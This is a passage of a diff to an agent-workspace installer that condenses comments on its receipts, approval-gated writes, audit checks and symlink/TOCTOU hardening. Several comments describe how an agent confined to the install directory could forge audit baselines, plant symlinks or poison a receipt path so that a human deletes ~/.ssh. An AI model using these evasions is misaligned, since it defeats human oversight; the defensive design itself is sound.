@@ -18,19 +18,14 @@ byte-identical to this repo, never transcribed by a model.
     install.py --target ~/aios --audit --package <clone> # deterministic post-install auditor
     install.py --target ~/aios --uninstall   # de-schedule managed jobs, then remove the tree
 
-Stdlib only. Refuses to overwrite a non-empty target; uninstall asks the
-scheduler to drop its managed jobs before deleting anything, and refuses a
-target that doesn't look like one of ours (degrade toward safety).
+Stdlib only. Refuses to overwrite a non-empty target; uninstall de-schedules
+managed jobs before deleting anything and refuses a target that doesn't look
+like one of ours.
 
-Wave 2H (SEED-068/069): every install writes a receipt at
-<ROOT>/.cc-seed/receipt.json (O_EXCL-created, so an agent can't pre-seed a
-fake one) recording a pre-write baseline of anything already at --target and
-approval records for the two highest-stakes agent-authored writes. --approve
-is the only thing that ever performs those two writes — the agent stages or
-shows, a human runs --approve, install.py both records the approval and
-moves the bytes. --audit then compares live state against the receipt and
-the package's own manifest (never the installed tree) — see
-docs/install-audit.md for the full design and its stated residuals.
+Every install writes <ROOT>/.cc-seed/receipt.json (O_EXCL-created) with a
+pre-write baseline and approval records for gated writes. --approve is the
+only path that performs a gated write; --audit compares live state against
+the receipt and the package manifest (see docs/install-audit.md).
 """
 import argparse
 import contextlib
@@ -62,11 +57,7 @@ HERE = Path(__file__).resolve().parent
 # What an install consists of — directories and files copied verbatim.
 COMPONENTS = ["_lib", "keyvault", "scheduler", "observability", "demo", "skills", "memory", "memory-mesh", "views",
               "session-brief", "friction-miner", "mcp-guard"]
-# Opt-in only (SEED-065): governance/ never ships via the default COMPONENTS
-# copy — a default `install.py --target <ROOT>` is byte-for-byte unchanged
-# by this wave. --enable-governance is the explicit "governance: none is
-# NOT the default, but activation IS" opt-in, run only when the recipient
-# says yes in AGENT-INSTALL.md's governance phase.
+# Opt-in only: governance/ is installed only by --enable-governance.
 OPTIONAL_COMPONENTS = ["governance"]
 ROOT_FILES = ["PRINCIPLES.md", "PROPOSALS.md", "CLAUDE.md.template", "README.md.template", "VERSION"]
 # Components whose EXISTING presence in an --into workspace satisfies the
@@ -84,16 +75,8 @@ JOB_HELLO_FLEET = """\
       /usr/bin/python3 {root}/demo/hello_fleet.py
 """
 
-# SEED-070: hello_fleet proves the spine works but gives an operator no
-# reason to come back tomorrow — a rival-model review of this backlog named
-# that gap directly. repo_hygiene is already shipped (it's freshness.py's
-# own dependency check, genericized in SEED-017/manifest.yml) and useful
-# from the moment the install root is a git repo, which SEED-002's meta-repo
-# pattern guarantees it always is — no history needs to accumulate first,
-# unlike views/weekly.py. --root pins the sweep to THIS workspace regardless
-# of CC_HYGIENE_ROOT; --findings-exit0 switches it to this seed's own
-# found-work-exits-0 convention (scheduler/CONVENTIONS.md rule 1) instead of
-# its default exit-1, which stays unchanged for the freshness.py import path.
+# Default job: daily hygiene sweep of this workspace. --findings-exit0 makes
+# found work exit 0 (scheduler/CONVENTIONS.md rule 1).
 JOB_REPO_HYGIENE = """\
   - name: repo_hygiene
     schedule: "30 6 * * *"
@@ -102,13 +85,9 @@ JOB_REPO_HYGIENE = """\
       /usr/bin/python3 {root}/observability/repo_hygiene.py --root {root} --findings-exit0
 """
 
-# SEED-074: the backstop that watches every OTHER job was itself unscheduled
-# until now — it ran only when a human thought to ask /status, while the
-# narrower repo_hygiene sweep was already a default. A monitor nobody runs is
-# not monitoring. Scheduled 07:15, after repo_hygiene's 06:30, so the daily
-# sweep's own result is already in runs.db when freshness reads it.
-# --write-findings is what turns a printed report into one the agent can find
-# at session start (see freshness.py's findings_path()).
+# Default job: the freshness backstop over every other job. Runs after
+# repo_hygiene so that result is already in runs.db; --write-findings leaves a
+# report the agent reads at session start.
 JOB_FRESHNESS = """\
   - name: freshness
     schedule: "15 7 * * *"
@@ -118,13 +97,9 @@ JOB_FRESHNESS = """\
 """
 
 
-# SEED-080 M6: the fold runs on its own systemd/launchd timer, outside the
-# scheduler entirely — so nothing in runs.db would ever notice it stopping.
-# This job is the outside observer (PRINCIPLES 21): it runs UNDER the
-# scheduler, so its own liveness is covered by the freshness backstop, and it
-# reports on the fold, the served index, the approved hook wiring and the
-# peers. Default-on for the same reason repo_hygiene is: a memory system that
-# cannot report its own breakage is worse than none, because it is trusted.
+# Default job: the fold runs on its own timer outside the scheduler, so this
+# job (run under the scheduler) watches the fold, served index, hook wiring
+# and peers.
 JOB_MESH_WATCH = """\
   - name: mesh_watch
     schedule: "25 * * * *"
@@ -136,21 +111,10 @@ JOB_MESH_WATCH = """\
 
 def _add_job(manifest: Path, job_name: str, block: str) -> bool:
     """Add one job's YAML block to scheduler/manifest.yml, idempotently.
-    Comment-excluded, EXACT line match (not startswith — a job named e.g.
-    `repo_hygiene_backup` must not read as `repo_hygiene` already being
-    present; the scaffold's own commented examples name real jobs too, so a
-    plain substring check reads as already-enabled either way — caught live
-    during SEED-017, sharpened to exact-match after the 2026-08-09 review
-    found the startswith version's false-positive class). Appends after any
-    jobs already present instead of requiring a pristine `jobs: []`, so
-    installing the SEED-070 default job first doesn't break a later
-    --enable-demo (or vice versa in an --into install where the recipient
-    enables the demo before this function ever runs). Atomic write, like
-    every other state-changing write in this file — the manifest is exactly
-    the kind of file a crash mid-write must never leave truncated, doubly so
-    now that SEED-072 hash-binds it as the sole proposal-allowlisted target.
-    Returns True if this call freshly added the job, False if it was
-    already present (caller decides what, if anything, to print)."""
+
+    Presence is an exact, comment-excluded line match (so `repo_hygiene_backup`
+    doesn't read as `repo_hygiene`). Appends after existing jobs and writes
+    atomically. Returns True if the job was newly added."""
     text = manifest.read_text()
     marker = f"- name: {job_name}"
     if any(line.strip() == marker
@@ -164,7 +128,7 @@ def _add_job(manifest: Path, job_name: str, block: str) -> bool:
     _atomic_write(manifest, new_text.encode("utf-8"))
     return True
 
-# --- Wave 2H: receipt / baseline / gated-write constants -------------------
+# --- receipt / baseline / gated-write constants ----------------------------
 CC_SEED_DIR = ".cc-seed"
 RECEIPT_NAME = "receipt.json"
 STAGED_DIR = "staged"
@@ -172,34 +136,22 @@ GATED_WRITES = {"claude-md", "mesh-bootstrap", "import-pack", "memory-hooks"}
 REVOCABLE_WRITES = {"memory-hooks"}
 MARKER_START = "<!-- cc-seed:start -->"
 MARKER_END = "<!-- cc-seed:end -->"
-_MAX_HASH_BYTES = 200 * 1024 * 1024  # Principle 8: bound the loop — don't hash unbounded files
+_MAX_HASH_BYTES = 200 * 1024 * 1024  # don't hash unbounded files
 
-# --- P3 (2026-08-08): cc-pack import — the gated write path -----------------
-# A pack (cc-pack/build_pack.py's output, verified by pack/import_pack.py
-# which ships alongside this file) is applied entirely OUTSIDE --target's own
-# git tree, into an out-of-repo delivery root — see _pack_delivery_root().
-# CLAUDE.md gets at most one pointer line, ever, at the very START of the
-# file (never the end — the cc-seed claude-md region, when present, must stay
-# the LAST thing in the file per check 3's invariant; _approve_claude_md
-# already appends after whatever precedes it, so writing the pack pointer
-# first and leaving claude-md's own append logic untouched makes the two
-# compose regardless of which gated write runs first).
+# --- cc-pack import: the gated write path ----------------------------------
+# A pack (verified by pack/import_pack.py) is applied outside --target's git
+# tree, into _pack_delivery_root(). CLAUDE.md gets at most one pointer line,
+# at the START of the file, so the cc-seed claude-md region stays last.
 PACKS_MARKER_START = "<!-- cc-pack:start -->"
 PACKS_MARKER_END = "<!-- cc-pack:end -->"
-# \A/\Z, not ^/$ (2026-08-08 P3 review, GPT): re.match with a trailing $
-# accepts a string ending in "\n" (Python's $ matches just before a final
-# newline, not only at the true end of string) — "foo\n" would pass this
-# check under ^...$ even though it embeds a control character none of the
-# OTHER path-safety helpers in this codebase would accept. \A/\Z has no
-# such exception.
+# \A/\Z, not ^/$: Python's $ also matches just before a trailing newline.
 _PACK_SAFE_COMPONENT_RE = re.compile(r"\A[A-Za-z0-9][A-Za-z0-9._-]*\Z")
 
 
 def _pack_is_safe_relpath(rel):
-    """Declared duplicate of cc-pack/pack_lib.py's is_safe_relpath (same
-    split as pack/import_pack.py — this file ships to targets without the
-    cc-pack repo). Must run before any path join: Path.__truediv__ silently
-    discards the left side when the right is absolute."""
+    """Duplicate of cc-pack/pack_lib.py's is_safe_relpath (cc-pack isn't
+    shipped). Must run before any path join: Path / discards the left side
+    when the right side is absolute."""
     if not rel or not isinstance(rel, str):
         return False
     if "\x00" in rel or "\\" in rel:
@@ -234,8 +186,7 @@ _ROOT_IN_CMD = re.compile(r"(/\S+)/observability/log_run\.py")
 
 def detect():
     """Read-only survey of prior AI-OS Seed (or adjacent AI-OS) footprints on
-    this machine, so a fresh install can ask instead of stumble. Always exit 0
-    — this reports, it never decides."""
+    this machine. Always exits 0 — it reports, never decides."""
     findings = []
 
     # 1. The crontab managed block (Linux; harmless empty result elsewhere).
@@ -288,7 +239,7 @@ def detect():
     return 0
 
 
-# --- Wave 2H: small primitives ---------------------------------------------
+# --- small primitives ------------------------------------------------------
 
 def _now() -> str:
     return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
@@ -320,10 +271,7 @@ _CONTROL_CHARS = re.compile(r"[\x00-\x1f\x7f-\x9f]")
 
 
 def _escape_path(s: str) -> str:
-    """C0/C1 control characters escaped before hitting a terminal — GPT
-    review #17: an unusual filename must not be able to inject a newline and
-    forge a fake PASS/FLAGGED line. Ordinary Unicode punctuation (em-dashes
-    included — this codebase's own prose style) passes through untouched."""
+    """Escape C0/C1 control characters so a filename can't forge output lines."""
     return _CONTROL_CHARS.sub(lambda m: m.group(0).encode("unicode_escape").decode("ascii"), s)
 
 
@@ -346,18 +294,10 @@ def _installer_commit() -> str:
 
 
 def _atomic_write(path: Path, data: bytes):
-    """Write `data` to `path` atomically via a same-directory temp file,
-    refusing to write THROUGH a pre-existing symlink at the temp path
-    (F3 fix, 2026-08-06 Gemini review): `Path.write_text`/`write_bytes`
-    open() with default flags, which follow symlinks — an agent that
-    pre-plants `<path>.tmp.<pid>` (or the old fixed `.tmp` sibling) as a
-    symlink to an arbitrary file gets that file's *contents* overwritten
-    the next time install.py saves, even though the final `os.replace`
-    only ever touches the symlink's own directory entry, not its target.
-    O_EXCL refuses ANY pre-existing path at the temp name — symlink or
-    not — rather than opening through it; a pid-qualified temp name also
-    makes the path non-guessable across concurrent installs (defense in
-    depth, not the primary fix)."""
+    """Write `data` to `path` atomically via a same-directory temp file.
+
+    O_EXCL|O_NOFOLLOW on a pid-qualified temp name refuses to write through a
+    pre-planted symlink."""
     tmp = path.with_name(path.name + f".tmp.{os.getpid()}")
     try:
         fd = os.open(str(tmp), os.O_CREAT | os.O_EXCL | os.O_WRONLY | getattr(os, "O_NOFOLLOW", 0), 0o600)
@@ -373,32 +313,18 @@ def _atomic_write(path: Path, data: bytes):
     os.replace(tmp, path)
 
 
-# --- TOCTOU hardening for apply_proposal/revert_proposal (wave2g2 review,
-# 2026-08-09, GPT+Gemini independently): the pre-existing code resolved
-# `dest = target / rel_target` once via pathlib (which follows symlinks at
-# every path component) and then read and wrote through that same path a
-# second time later — an agent scoped to --target could swap
-# `target/scheduler` for a symlink between those two path-walks and
-# redirect the read (information disclosure via the hash-check) or the
-# write. `_atomic_write`'s own O_EXCL/O_NOFOLLOW discipline only protects
-# the FINAL path component; it does nothing about a symlinked directory
-# earlier in the path. The functions below use descriptor-relative
-# (openat-style) resolution instead: every directory component between
-# `target` and the file is opened relative to its already-verified parent
-# fd, refusing with O_NOFOLLOW if that component is anything but a plain
-# directory, so there is no window between "checked" and "used" for a
-# symlink swap to land in.
+# --- TOCTOU hardening for apply_proposal/revert_proposal --------------------
+# _atomic_write only protects the final path component. These helpers open
+# each directory component relative to its verified parent fd with
+# O_NOFOLLOW, so a symlinked-directory swap has no check-then-use window.
 def _opendir_nofollow_at(dir_fd: int, name: str) -> int:
     return os.open(name, os.O_RDONLY | os.O_DIRECTORY | getattr(os, "O_NOFOLLOW", 0), dir_fd=dir_fd)
 
 
 def _resolve_target_dir_fd(target: Path, rel_target: str):
-    """Descriptor-relative resolution of every directory component between
-    `target` and the final path segment of `rel_target` (e.g. "scheduler"
-    for "scheduler/manifest.yml"). Returns (dir_fd, filename); caller must
-    os.close(dir_fd) (a `with contextlib.closing(...)`-friendly int, not a
-    context manager itself, since callers need it open across a read AND
-    a later write)."""
+    """Open every directory component of `rel_target` but the last, each
+    relative to its verified parent with O_NOFOLLOW. Returns (dir_fd,
+    filename); the caller must os.close(dir_fd)."""
     parts = rel_target.split("/")
     fd = os.open(str(target), os.O_RDONLY | os.O_DIRECTORY)
     try:
@@ -418,10 +344,8 @@ def _resolve_target_dir_fd(target: Path, rel_target: str):
 
 
 def _read_bytes_at(dir_fd: int, name: str) -> bytes:
-    """Read `name` relative to an already-verified directory fd, refusing
-    if `name` itself is a symlink (O_NOFOLLOW). Missing is treated as
-    empty, matching the `dest.read_bytes() if dest.exists() else b""`
-    behavior this replaces."""
+    """Read `name` relative to a verified directory fd, refusing a symlink.
+    Missing reads as empty."""
     try:
         fd = os.open(name, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0), dir_fd=dir_fd)
     except FileNotFoundError:
@@ -433,11 +357,7 @@ def _read_bytes_at(dir_fd: int, name: str) -> bytes:
 
 
 def _atomic_write_at(dir_fd: int, name: str, data: bytes):
-    """Same O_EXCL/O_NOFOLLOW-tempfile-then-rename discipline as
-    _atomic_write() above, but every operation is relative to an
-    already-verified directory fd instead of a path re-walked from
-    scratch, so the write lands in the directory the caller already
-    checked, not wherever a symlink swap since then might point."""
+    """_atomic_write(), but relative to an already-verified directory fd."""
     tmp = f"{name}.tmp.{os.getpid()}"
     flags = os.O_CREAT | os.O_EXCL | os.O_WRONLY | getattr(os, "O_NOFOLLOW", 0)
     try:
@@ -452,7 +372,7 @@ def _atomic_write_at(dir_fd: int, name: str, data: bytes):
                 f"refusing to write {name} — {tmp} already exists and isn't a plain "
                 f"leftover file (possible symlink plant); remove it by hand after "
                 f"confirming what it is")
-        os.unlink(tmp, dir_fd=dir_fd)  # plain leftover from a crashed prior run — retry once
+        os.unlink(tmp, dir_fd=dir_fd)  # plain leftover from a crashed run — retry once
         fd = os.open(tmp, flags, 0o600, dir_fd=dir_fd)
     with os.fdopen(fd, "wb") as f:
         f.write(data)
@@ -461,16 +381,8 @@ def _atomic_write_at(dir_fd: int, name: str, data: bytes):
 
 @contextlib.contextmanager
 def _proposal_lock(target: Path):
-    """Serializes apply_proposal/revert_proposal against each other and
-    against a second concurrent install.py invocation, closing the window
-    GPT+Gemini also flagged: the hash-check and the write are two
-    operations, not one, so something could touch the target between them
-    even with the descriptor-relative resolution above (which defends
-    against a symlink SWAP, not a plain concurrent EDIT). flock is
-    advisory — it cannot stop a process that ignores it — but it makes two
-    honest install.py runs safe, which is the actual concurrency this
-    tool sees in practice. Degrades to no lock (not a crash) if fcntl is
-    unavailable."""
+    """Serialize apply_proposal/revert_proposal across concurrent install.py
+    runs (advisory flock). No-op if fcntl is unavailable."""
     if fcntl is None:
         yield
         return
@@ -496,37 +408,23 @@ def _load_receipt(target: Path):
     return json.loads(p.read_text())
 
 
-# --- Wave 2H-2 (F1 fix, 2026-08-06 Gemini review): out-of-target receipt
-# anchor. receipt.json lives under --target, so a same-uid agent scoped to
-# --target can rewrite a tampered file AND forge a matching baseline entry
-# for it, laundering the tamper past --audit check 1 entirely. A mirror
-# copy written outside --target on every install.py-performed save gives
-# --audit (check 7) something to cross-check the live receipt against that
-# a --target-scoped agent can't also rewrite. This raises the bar against
-# exactly the threat class this wave defends (a confused or scoped agent);
-# it does not defend against a fully compromised same-uid process with
-# unrestricted filesystem access — that residual is already disclosed.
+# --- out-of-target receipt anchor --------------------------------------------
+# receipt.json lives under --target, so an agent scoped there could tamper a
+# file and forge its baseline entry. A mirror copy outside --target gives
+# --audit check 7 something to cross-check. It does not defend against an
+# unrestricted same-uid process.
 def _target_slug(target: Path) -> str:
-    # Full digest, not a truncated prefix (2026-08-08 P3 review, GPT: a
-    # 16-hex-char/64-bit prefix is an unnecessary collision boundary on a
-    # value that scopes both the receipt anchor and the pack delivery root
-    # — cheap to widen, no format that depends on the short form exists yet).
+    # Full digest: scopes both the receipt anchor and the pack delivery root.
     return hashlib.sha256(str(target).encode()).hexdigest()
 
 
 def _package_sha(package: Path) -> str:
-    """One hash over every shipped path and its content in the package this
-    install is being made FROM — the identical construction as
-    tools/contract_evidence.dist_sha(), so a contract run inside the install
-    can name the exact dist/ it is evidence for (2026-09-19: evidence used to
-    be bound to dist at RECORD time, so a green run from one build could be
-    stamped onto another)."""
+    """One hash over every shipped path and its content in the source package.
+    Same construction as tools/contract_evidence.dist_sha()."""
     h = hashlib.sha256()
     try:
         for p in sorted(Path(package).rglob("*")):
-            # .git too: a package delivered as a checkout (the beta drop) must
-            # hash like dist/ itself, or the receipt can never name the dist
-            # it came from (2026-09-26, first beta update on {{REDACTED}}).
+            # Skip .git so a checkout-delivered package hashes like dist/.
             if not p.is_file() or "__pycache__" in p.parts or ".git" in p.relative_to(package).parts:
                 continue
             h.update(p.relative_to(package).as_posix().encode())
@@ -536,49 +434,25 @@ def _package_sha(package: Path) -> str:
     return h.hexdigest()
 
 
-# --- SEED-080 round 2 (R2): what actually RAN, not what the receipt claims ---
-# `package_sha` above names the dist/ the install came FROM, and contract_test
-# copied it into the evidence as `tested_sha`. That is a CLAIM, not a
-# measurement: sabotage <root>/memory-mesh/memory_write.py after the install and
-# the contract still reported the clean dist sha, went 14/14 GREEN, and
-# contract_evidence recorded and verified it. Reproduced on {{REDACTED}}
-# 2026-09-19 — the publish gate was proving the bytes in dist/, never the bytes
-# that ran.
+# --- installed_sha: what is actually on disk, not what the receipt claims ---
+# Same algorithm as contract_evidence.dist_sha() (sorted relative posix path,
+# then each file's sha256), run over the shipped files in the TARGET. Recorded
+# at install time and recomputed by the contract test. contract_test.py holds
+# a byte-identical copy of installed_sha(); tools/selftest_installed_sha.py
+# asserts they agree.
 #
-# INSTALLED_SHA_EXEMPT / installed_sha() are the answer: the SAME algorithm as
-# contract_evidence.dist_sha() — sorted relative posix path, then the sha256 of
-# each file's bytes — run over the shipped files AS THEY SIT IN THE TARGET.
-# Recorded at install time and recomputed live by the contract, so drift
-# between them is a measurement, not a story. contract_test.py carries a
-# byte-identical copy of installed_sha() (it lives in the installed tree and
-# cannot import this file); tools/selftest_installed_sha.py asserts the two
-# agree, so the copies cannot drift apart silently.
-# Prefixes a shipped tool WRITES INTO at runtime, by design: the run log and
-# the brief store. Nothing is shipped under them, so hashing their contents
-# measures how much the system has been USED, not whether its bytes are
-# intact — runs.db alone changes on every scheduled job, so M0 went red
-# within minutes of any real install and stayed red (found on {{REDACTED}},
-# 2026-09-19, where it read as "the bytes running here are not the bytes
-# this install wrote"). check 1 already skipped exactly these; the hash had
-# never been told.
+# Prefixes shipped tools write into at runtime (run log, brief store). Nothing
+# ships under them, so they are excluded from the hash and from check 1.
 RUNTIME_WRITABLE_PREFIXES = ("observability/data/", "session-brief/briefs/")
-# Roots the OPERATOR owns outright: private add-ons this package never ships,
-# never updates and never rolls back (a fleet member's own code checkouts,
-# governed by their own tooling). --audit skips them rather than calling every
-# file there UNEXPECTED — which would flag every audit and fail a beta soak
-# for content that was never the package's to vouch for. --update and
-# --rollback already only touch shipped/planned paths, so they leave it alone.
+# Roots the operator owns outright (private add-ons the package never ships).
+# --audit skips them; --update and --rollback never touch them.
 OPERATOR_OWNED_PREFIXES = ("fleet/",)
-# Shipped files the operator is TOLD to edit — their own job list and mesh
-# membership. Like scheduler/manifest.yml: not byte-compared against the
-# package by --audit, not in installed_sha, never auto-written by --update.
-# Flagging them made every real install's audit permanently FLAGGED.
+# Shipped files the operator is told to edit. Not byte-compared by --audit,
+# not in installed_sha, never auto-written by --update.
 OPERATOR_EDITABLE_CONFIG = ("observability/freshness.json", "memory-mesh/mesh.toml")
-# The operator's own declaration of what else in the install is theirs — one
-# path per line (a trailing / = a directory prefix). An entry that covers a
-# path the package ships is REFUSED and reported: a declaration can widen
-# what the audit leaves alone, never hide a change to shipped code. Every
-# honored entry is listed in the audit result, so it stays visible.
+# The operator's own list of other paths that are theirs, one per line (a
+# trailing / is a directory prefix). An entry covering a shipped path is
+# refused and reported; honored entries are listed in the audit result.
 OPERATOR_OWNED_FILE = "operator-owned"
 
 
@@ -606,9 +480,7 @@ def _operator_declared(target: Path, package_paths):
 
 INSTALLED_SHA_EXEMPT = {
     *OPERATOR_EDITABLE_CONFIG,
-    # --enable-demo legitimately rewrites this file in place, which is why
-    # check 1 skips it too. Hashing it would make every post-demo install
-    # permanently "drifted".
+    # --enable-demo rewrites this file in place.
     "scheduler/manifest.yml",
 }
 
@@ -628,11 +500,7 @@ def installed_sha(target: Path, components, root_files) -> str:
             paths.append(p)
     for p in sorted(paths):
         rel = p.relative_to(Path(target)).as_posix()
-        # .git is a working checkout's own churn — index, FETCH_HEAD and
-        # the ref logs move on every fetch, so a component kept under
-        # version control (memory-mesh on {{REDACTED}} is, by doctrine) was
-        # permanently "drifted": 446 measured paths differed, 400+ of
-        # them .git internals. Same reasoning as __pycache__.
+        # Skip .git internals (they churn on every fetch) and __pycache__.
         if "__pycache__" in p.parts or ".git" in p.parts \
                 or rel in INSTALLED_SHA_EXEMPT:
             continue
@@ -646,21 +514,14 @@ def installed_sha(target: Path, components, root_files) -> str:
 def _refresh_installer(target: Path, new_tree: Path) -> bool:
     """Replace the target's own install.py with the fetched tree's.
 
-    install.py is not a SHIPPED path, so --update never touched it: every
-    install kept the installer it was born with, forever. {{REDACTED}} was found
-    running the 0.3.8 installer after updating to 0.4.2 (2026-09-19) — its
-    default jobs, its receipt fields and its skill-shadowing behaviour were
-    all three versions stale, and no verb could move it. Replacing the file
-    mid-run is safe: Python has already read and compiled this module, and
-    the write is atomic, so the running process keeps its own bytes.
+    install.py is not a shipped path, so --update would otherwise leave the
+    original installer in place forever. Safe mid-run: this module is already
+    compiled and the replace is atomic.
     """
     src = new_tree / "install.py"
     dst = target / "install.py"
-    # ONLY refresh one that is already there. A fresh install does NOT place
-    # install.py in the target — the operator runs it from wherever they
-    # downloaded it — so creating one here would add a path the package audit
-    # rightly reports as unexpected (caught by selftest_skill_origin, which
-    # went FLAGGED the moment this wrote a file install() never writes).
+    # Only refresh an existing copy: a fresh install doesn't place install.py
+    # in the target, and adding one would show up as unexpected in --audit.
     if not src.is_file() or not dst.is_file():
         return False
     body = src.read_bytes()
@@ -685,36 +546,25 @@ def _anchor_path(target: Path) -> Path:
 
 
 def _pack_delivery_root(target: Path) -> Path:
-    """P3: where imported-pack content actually lands — out-of-repo, on
-    purpose (see the GATED_WRITES comment above). Same slug construction as
-    _anchor_path, factored into _target_slug per the design doc's own
-    instruction, so the two locations can never drift onto different slugs
-    for the same target."""
+    """Where imported-pack content lands — outside the repo. Shares
+    _target_slug with _anchor_path so the two never use different slugs."""
     xdg_state = os.environ.get("XDG_STATE_HOME") or str(Path.home() / ".local" / "state")
     return Path(xdg_state) / "cc-pack" / _target_slug(target)
 
 
 def _expected_pack_dest(target: Path, pack_id: str) -> Path:
-    """The ONLY trustworthy delivery-root path for a given pack id — always
-    RE-DERIVED, never read from receipt.json's `delivery_path` field for any
-    operation that deletes or otherwise trusts filesystem content (2026-08-08
-    P3 tri-model review, consensus CRITICAL finding, all three reviewers
-    independently: a same-uid agent scoped to --target can edit the live
-    receipt — that's the entire reason the out-of-target anchor/check 7
-    exist — and `remove_pack`/check 9 read `delivery_path` straight off that
-    same untrusted receipt and used it for `shutil.rmtree()` / hashing. An
-    agent could set `delivery_path` to `~/.ssh` and have a human's later
-    `--remove-pack` delete it. `delivery_path` in the receipt is now
-    DISPLAY/PROVENANCE ONLY — every filesystem operation uses this function."""
+    """The only trustworthy delivery path for a pack id — always re-derived.
+
+    The receipt's `delivery_path` is agent-editable and is display-only; any
+    delete or hash must use this function, never that field."""
     if not _pack_is_safe_component(pack_id):
         raise ValueError(f"pack id {pack_id!r} is not a safe path component")
     return _pack_delivery_root(target) / "packs" / pack_id
 
 
 def _save_anchor(target: Path, receipt: dict):
-    """Best-effort — a failure here must never block the real receipt write
-    (degrade toward safety: --audit's check 7 reports SKIPPED, not ERROR,
-    when no anchor is found)."""
+    """Best-effort mirror write; never blocks the real receipt (check 7 then
+    reports SKIPPED)."""
     try:
         anchor = _anchor_path(target)
         anchor.parent.mkdir(parents=True, exist_ok=True)
@@ -742,30 +592,19 @@ def _save_receipt(target: Path, receipt: dict):
 
 
 def _init_receipt(target: Path, mode: str) -> dict:
-    """Create the receipt with O_EXCL — refuses if one already exists (an
-    agent can't silently pre-seed a fake baseline, and a stale receipt from a
-    prior partial attempt is surfaced rather than silently overwritten)."""
+    """Create the receipt with O_EXCL, refusing if one already exists (no
+    pre-seeded fake baseline; a stale receipt is surfaced, not overwritten)."""
     d = target / CC_SEED_DIR
     d.mkdir(parents=True, exist_ok=True)
     p = d / RECEIPT_NAME
     fd = os.open(str(p), os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
     os.close(fd)
     receipt = {
-        # 2 (2026-09-19, SEED-080 bug bash). What changed:
-        #   install.refused_skills[]        — a skill the origin rule REFUSED
-        #   gated_writes.memory-hooks.entries        — now ONLY what was added
-        #   gated_writes.memory-hooks.already_present — what was already wired
-        #   gated_writes.memory-hooks.adopted        — wired before we arrived
-        #   gated_writes.memory-hooks.prior_bytes_len — replaces prior_bytes,
-        #       which copied the user's whole settings.json (API key and all)
-        #       into the receipt AND the out-of-target anchor
-        #   install.package_sha              — the dist the install came from
-        # Nothing READS `schema`, and every reader of the fields above uses
-        # .get() with a default, so a schema-1 receipt keeps working: a
-        # missing refused_skills is no refusals, a missing prior_bytes_len is
-        # simply not reported, and prior_bytes on an old receipt is left alone
-        # rather than rewritten (an uninstall removes it with the receipt).
-        # Migration note: docs/install-audit.md.
+        # Schema 2 adds install.refused_skills, install.package_sha, and
+        # memory-hooks entries/already_present/adopted/prior_bytes_len
+        # (replacing prior_bytes, which copied settings.json). Readers use
+        # .get() defaults, so schema-1 receipts still work. See
+        # docs/install-audit.md.
         "schema": 2,
         "install": {
             "target": str(target), "mode": mode,
@@ -781,11 +620,9 @@ def _init_receipt(target: Path, mode: str) -> dict:
 
 
 def _capture_baseline(target: Path, receipt: dict):
-    """Full lstat-based inventory of every path already under target, taken
-    as step one after the receipt exists and before any component is
-    written. Symlinks are recorded via lstat, never followed; regular files
-    get a content hash (skipped past _MAX_HASH_BYTES — bound the loop, not
-    the coverage: still enumerated, just not read)."""
+    """lstat-based inventory of everything already under target, taken before
+    any component is written. Symlinks are recorded, never followed; files
+    over _MAX_HASH_BYTES are listed but not hashed."""
     baseline = {}
     for p in sorted(target.rglob("*")):
         rel = p.relative_to(target).as_posix()
@@ -824,35 +661,20 @@ def install(target: Path, into: bool = False):
                        f"agent's existing workspace and you want the seed to move "
                        f"in alongside your content, re-run with --into. Otherwise "
                        f"pick an empty/new directory.")
-        # Compose mode: the seed joins an existing workspace. Same covenant,
-        # applied per-name instead of per-tree — every component and root file
-        # the seed would write must be ABSENT; everything else in the
-        # workspace is the user's and is never touched. No partial merges: one
-        # collision refuses the whole install, loudly, before any byte moves.
+        # Compose mode: every component and root file the seed would write
+        # must be ABSENT; everything else is the user's and untouched. One
+        # collision refuses the whole install before any byte moves.
         #
-        # One exception, learned on a real machine: memory/. The seed's
-        # memory component is an EMPTY scaffold for a discipline; a workspace
-        # that already has memory/ (every AI-OS Core does — it's the user's
-        # live, cwd-keyed brain) already practices it. Existing memory
-        # SATISFIES the requirement, so it's skipped whole — nothing is
-        # written into it, not even the conventions doc. Functional
-        # components get no such pass: a colliding scheduler/ or _lib/ holds
-        # the user's bytes, not the seed's, and skipping one would produce an
-        # install that only thinks it's complete.
+        # Exception: an existing memory/ satisfies the memory component and is
+        # skipped whole. Functional components get no such pass.
         skipped = [c for c in SATISFIED_BY_EXISTING if (target / c).is_dir()]
         collisions = [c for c in COMPONENTS + ROOT_FILES
                       if (target / c).exists() and c not in skipped]
-        # SEED-071: .claude/skills/<name> isn't a COMPONENTS entry (skills/
-        # is), so it needs its own pre-check here — same no-partial-merges
-        # guarantee, checked before target.mkdir()/any copytree below rather
-        # than discovered mid-registration after skills/ already landed.
+        # .claude/skills/<name> isn't a COMPONENTS entry, so pre-check it here
+        # before anything is written.
         if "skills" not in skipped:
-            # exists() OR is_symlink() — a dangling symlink left by a prior
-            # partial install/uninstall reads exists()==False but must still
-            # collide, matching _register_skills()'s own backstop predicate
-            # (2026-08-09 review: the two had drifted, which meant a dangling
-            # link passed this check only to trip the assert AFTER skills/
-            # was already copied).
+            # exists() OR is_symlink(): a dangling link must still collide,
+            # matching _register_skills()'s backstop.
             skill_collisions = []
             for n in _shipped_skill_names():
                 p = target / ".claude" / "skills" / n / "SKILL.md"
@@ -875,9 +697,7 @@ def install(target: Path, into: bool = False):
                    f"re-clone rather than installing from a partial tree.")
     target.mkdir(parents=True, exist_ok=True)
 
-    # Wave 2H: the receipt + pre-write baseline are step one, before any
-    # component lands — a same-uid agent can't rewrite a snapshot taken
-    # after the fact, because there isn't one; this IS the snapshot.
+    # The receipt and pre-write baseline come first, before any component.
     try:
         receipt = _init_receipt(target, "into" if into else "fresh")
     except FileExistsError:
@@ -897,18 +717,14 @@ def install(target: Path, into: bool = False):
     default_jobs = _install_default_jobs(target) if "scheduler" in written else []
     receipt["install"]["components"] = written
     receipt["install"]["registered_skills"] = registered_skills
-    # Merge BEFORE the _save_receipt below, not from inside _register_skills —
-    # that save is the one that used to clobber the deferrals.
+    # Merge before the _save_receipt below so the deferrals aren't clobbered.
     _merge_deferred(receipt, deferred_skills)
     _merge_refused(receipt, refused_skills)
     receipt["install"]["default_jobs"] = default_jobs
-    # SEED-076: snapshot exactly what THIS install wrote, scoped to `written`
-    # (never a skipped-as-satisfied-by-existing component) — so --update has
